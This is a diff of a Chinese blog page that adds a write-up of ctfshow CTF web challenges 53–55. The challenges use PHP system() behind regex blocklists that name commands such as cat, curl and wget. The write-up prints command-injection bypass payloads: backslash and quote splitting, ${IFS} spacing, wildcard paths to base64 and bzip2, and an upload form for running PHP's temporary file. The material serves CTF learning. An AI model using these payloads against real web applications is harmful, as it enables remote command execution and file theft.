@@ -485,21 +485,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-25
+                    2022-12-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    5.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    20 分
+                    24 分
                 </div>
                 
 
@@ -852,6 +852,65 @@ if(isset($_GET[&#39;c&#39;]))&#123;
 <p><img src="https://img-blog.csdnimg.cn/544786daf0d548bcb21a19e559b8fff1.png" alt="52"></p>
 <p><img src="https://img-blog.csdnimg.cn/7ccadf2e2cdc4d1cad6a66f14f0f46e5.png" alt="52"></p>
 <p>等价于<code>?c=ls /;</code>其中“&#x2F;”是根目录。说明flag在根目录下<br>移动flag到吧.txt文件中，构造：<br><img src="https://img-blog.csdnimg.cn/be5efde9753041b7b3e09b29a91ecf29.png" alt="52"><br>查看b.txt<br><img src="https://img-blog.csdnimg.cn/49168164263d4d93a5d74996b5bffe30.png" alt="52"><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/7d1d0459de804272ae8aea67cfe41784.png" alt="52"></p>
+<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>把tac过滤掉了，使用tac时用t\ac不就行了吗？<br>构造：<code>ls%0a</code><br><img src="https://img-blog.csdnimg.cn/c3df993696314026bf5e3f09c92bfed2.png" alt="53"><br>构造：<code>ta\c$&#123;IFS&#125;fl\ag.php%0a</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/83fd360699064877aa18112049e00594.png" alt="53"></p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>好奇怪</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c);&#x2F;&#x2F;|.*c.*a.*t.*|的意思是cat 和cat之间插入字符都被过滤了，相当于引号绕过用不了了c&quot;&quot;at也会被过滤
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>?c=ls%0a</code>查看一下，<br><img src="https://img-blog.csdnimg.cn/bc99561bcda249aeb4dcd6bfb536e88a.png" alt="54"><br><code>/?c=t&#39;&#39;ac$&#123;IFS&#125;fl??.php%0a</code>无回显。那就将flag.php的名字改一下，<code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;c.txt</code>查看c.txt得到flag。<br><img src="https://img-blog.csdnimg.cn/e0c0b3fb362541a494d84e24c336876c.png" alt="54"></p>
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;&#x2F; 你们在炫技吗？
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c&#x3D;$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
+        system($c);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这下好了，过滤了字母，但是数字没有过滤，数字？64？用base64加密内容。原内容为<code>/bin/base64 flag.php</code>过滤了字母？用？代替，然后为：<code>/???/????64 ????.???</code><br><img src="https://img-blog.csdnimg.cn/aede99d5d50a4c958806d913e1a910e4.png" alt="55"><br>解密后得到<br><img src="https://img-blog.csdnimg.cn/39f6b55ee217431cb0f50b6b5fab570f.png" alt="55"><br> 知识点：<br> 可以匹配到&#x2F;bin目录下的命令</p>
+<blockquote>
+<p>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
+</blockquote>
+<p> <strong>方法二</strong></p>
+<p>参考的wp,有用bzip2的命令的。请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq313088385/article/details/114382259">这里</a></p>
+<blockquote>
+<p> 命令名称：bzip2<br> 命令全称：a block-sorting file compressor<br> 执行权限：所有用户<br> 所在路径：&#x2F;usr&#x2F;bin&#x2F;bzip2<br> 功能描述：压缩文件</p>
+</blockquote>
+<p>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c&#x3D;&#x2F;???&#x2F;???&#x2F;???2 ????.???<br>也就是&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php<br>然后访问&#x2F;flag.php.bz2进行下载获得flag.php</p>
+<p><strong>方法三</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/snowlyzz/article/details/125051503">参考</a></p>
+<p>前提是 题目没有过滤 ? &#x2F; . (问号，斜杠,点)，就可以使用这个方法进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p>
+<p>编写 本地文件上传的网页：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0bb2c3a2-2646-491d-80fa-52c6bee9decc.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--链接是当前打开的题目链接--></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。至于后面为什么要加[@-[],是为了匹配到文件的最后一个字母的大写</p>
+<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。<br>构造poc执行命令</p>
+<blockquote>
+<p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p>
+</blockquote>
+<p>注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p>
 
                 
             </div>
@@ -1703,7 +1762,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.6k</span>&nbsp;字
+                class="white-color">9.4k</span>&nbsp;字
             
             
             
